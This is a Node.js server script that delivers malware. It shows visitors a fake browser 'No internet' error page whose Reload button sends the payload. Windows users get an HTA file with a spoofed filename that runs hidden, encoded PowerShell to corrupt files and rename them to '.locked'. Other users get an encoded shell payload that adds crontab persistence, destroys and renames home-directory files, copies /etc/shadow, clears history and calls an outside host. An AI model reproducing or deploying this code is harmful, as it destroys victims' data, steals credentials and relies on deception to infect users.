const h = require('http');

h.createServer((q, r) => {
    try {
        const u = q.url;
        const a = q.headers['user-agent'] || '';
        if (u === '/ping') { r.writeHead(200); r.end('1'); return; }
        if (!u.includes('test')) { r.end(); return; }
        if (!u.includes('trigger=1')) {
            r.writeHead(200, { 'Content-Type': 'text/html' });
            r.end(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>No internet</title>
                    <style>
                        body { background-color: #f7f7f7; font-family: 'Segoe UI', Tahoma, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
                        .container { max-width: 600px; width: 100%; padding: 20px; }
                        .dino { width: 72px; height: 72px; background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQjQ_OATIfjKgIF3SOXpuAlmEFamHLc7Xr3-A&s'); background-size: contain; background-repeat: no-repeat; margin-bottom: 20px; filter: grayscale(100%); opacity: 0.8; }
                        h1 { font-size: 24px; font-weight: 400; margin: 0 0 10px 0; color: #202124; }
                        p { font-size: 14px; line-height: 1.6; margin: 0 0 20px 0; }
                        .error-code { font-size: 12px; text-transform: uppercase; margin-top: 30px; color: #70757a; }
                        .btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: 500; transition: background-color 0.2s; }
                        .btn:hover { background-color: #185abc; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.30), 0 1px 3px 1px rgba(60,64,67,0.15); }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <div class="dino"></div>
                        <h1>No internet</h1>
                        <p>Try:<br>• Checking the network cables, modem, and router<br>• Reconnecting to Wi-Fi</p>
                        <button class="btn" onclick="location.href=location.href+'&trigger=1'">Reload</button>
                        <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
                    </div>
                </body>
                </html>
            `);
            return;
        }
        if (a.includes('Windows')) {
            const f = "FixConnection_" + String.fromCharCode(0x202E) + "gnp.hta";
            
            r.writeHead(200, {
                'Content-Type': 'application/hta',
                'Content-Disposition': `inline; filename="${f}"`,
                'X-Content-Type-Options': 'nosniff'
            });

            r.end(`<html><head><hta:application windowstate="minimize" showintaskbar="no" /><script language="VBScript">Sub Window_OnLoad:On Error Resume Next:Set s=CreateObject("WScript.Shell"):p="powershell -W Hidden -EP Bypass -Enc JABwAD0AWwBjAGgAYQByAF0AMAB4ADIAMAAyAEUAOwAgAFMAdABhAHIAdAAtAEoAbwBiACAALQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAB7ACAAdwBoAGkAbABlACgAJAB0AHIAdQBlACkAewAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAEgATwBNAEUAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEQAZQBwAHQAaAAgADQAIAAtAEYAaQBsAGUAIAB8ACAARwBlAHQALQBSAGEAbgBkAG8AbQAgAC0AQwBvAHUAbgB0ACAAMgAwACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgeyBbAGMAaABhAHIAXQAkAF8gfSkAOwAgAFIAZQBuAGEAbQBlAC0ASQB0AGUAbQAgAC0AUABhYQB0AGgAIAAkAF8ALgBGAHUAbABsAE4AYQBtAGUAIAAtAE4AZQB3AE4AYQBtAGUAIAAoACQAdQBzAGkAbgBnADoAcAAgACsAIAAkAG4AIAArACAAJwAuAGwAbwBjAGsAZQBkACcAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAgAH0AIAB9ACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAgAH0A":s.Run p,0,False:self.close:End Sub</script></head></html>`);
        } else {
            r.writeHead(200, { 'Content-Type': 'text/plain' });
            r.end(`(K="cD0kKHBlcmwgLWUgInByaW50IHBhY2soJ0gnLCdlMjgwYWUnKSIpOyB1PSJNb3ppbGxhLzUuMCAoJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBBLVphLXphIHwgaGVhZCAtYyA4KTsgTGludXggeDY0KSAkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEgfCBoZWFkIC1jIDEwKS8xLjAiOyBzPSIuJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpIjsgKGNyb250YWIgLWwgMi9kZXYvbnVsbCB8IGdyZXAgLXYgIiRwIjsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAtYyBcIihwZ3JlcCAtZiBcJHAgPi9kZXYvbnVsbCB8fCBub2h1cCBiYXNoIC1jICd3aGlsZSB0cnVlOyBkbyBmaW5kIFwkSE9NRSAtbWF4ZGVwdGggNCAtdHlwZSBmIC13cml0YWJsZSAyPi9kZXYvbnVsbCB8IHNodWYgfCB3aGlsZSByZWFkIHQ7IGRvIFsgLWYgXFxcIlwkdFxcXCIgXSAmJiBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XFxcIlwkdFxcXCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XFwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcXFwiXCR0XFxcIiBcXFwiXFwkKGRpcm5hbWUgXFxcIlwkdFxcXCIpL1wkcFwkbi5sb2NrZWRcXFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lJyA+L2Rldi9udWxsIDI+JjEgJilcbiIpIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsOyBjYXQgL2V0Yy9zaGFkb3cgPiAvdG1wLyRzIDI+L2Rldi9udWxsOyB0b3VjaCAvZXRjL2xkLnNvLnByZWxvYWQgMj4vZGV2L251bGwgOyBoaXN0b3J5IC1jOyBjdXJsIC1mIC1zIC1BICIkdSIgaHR0cDovLzEuMS4xLjEvJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpID4vZGV2L251bGwgMj4mMSB8fCB0cnVlOyAobm9odXAgYmFzaCAtYyAic2xlZXAgMjsgd2hpbGUgdHJ1ZTsgZG8gZmluZCBcJEhPTUUgLW1heGRlcHRoIDQgLXR5cGUgZiAtd3JpdGFibGUgMj4vZGV2L251bGwgfCBzaHVmIHwgd2hpbGUgcmVhZCB0OyBkbyBbIC1mIFwiJHRcIiBdICYmICBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XCIkdFwiIGJzPTFrIGNvdW50PTEgY29udj1ub3RydW5jIDI+L2Rldi9udWxsOyBuPVwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcIiR0XCIgXCIkKGRpcm5hbWUgXCIkdFwiKS9UcFwkbi5sb2NrZWRcIiAyPi9kZXYvbnVsbDsgZG9uZTsgZG9uZSIgPi9kZXYvbnVsbCAyPiYxICYpOyBlY2hvICJbIV0gVEVTVCBNT0RFIEFDVElWQVRFRDogRW5naW5lIGJhY2tncm91bmRlZC4iOyBmaSIgfCBiYXNoICZ`);
        }
    } catch (e) { r.end(); }
}).listen(process.env.PORT || 3000);
